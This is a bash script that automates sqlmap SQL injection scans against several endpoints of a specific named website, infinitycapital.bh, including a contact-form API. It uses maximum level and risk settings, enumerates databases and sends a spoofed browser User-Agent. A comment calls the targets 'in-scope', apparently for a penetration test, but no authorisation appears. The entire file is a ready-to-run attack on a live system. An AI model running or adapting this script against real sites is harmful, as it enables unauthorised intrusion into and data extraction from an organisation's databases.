#!/bin/bash
# Background driver: run sqlmap over each in-scope parameterised endpoint.
cd "$(dirname "$0")"
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
B="https://www.infinitycapital.bh"
mkdir -p logs

run() {
  name="$1"; shift
  echo "=== START $name $(date -u +%T) ==="
  sqlmap "$@" --batch --level=5 --risk=3 --threads=4 --dbs \
    --headers="Accept: text/html,application/xhtml+xml|User-Agent: $UA" \
    --output-dir="out_$name" > "logs/$name.log" 2>&1
  echo "=== END $name rc=$? $(date -u +%T) ==="
}

run home -u "$B/?id=1&page=2&search=test"
run contact -u "$B/contact?cb=1&q=test&x=1"
run img -u "$B/_next/image?url=http://images.ctfassets.net/x.jpg&w=1080&q=75"
run api -u "$B/api/?id=1&page=2"
run feed -u "$B/feeds/all.atom.xml?id=1"
run atom -u "$B/atom.xml?id=1"
run nf404 -u "$B/404?q=test"

run apisend --data='fname=A&lname=B&areacode=1&tel=2&cname=C&subject=S&msg=M&check=1&targets=a@b.com' -u "$B/api/send"

echo "ALL DONE $(date -u +%T)"
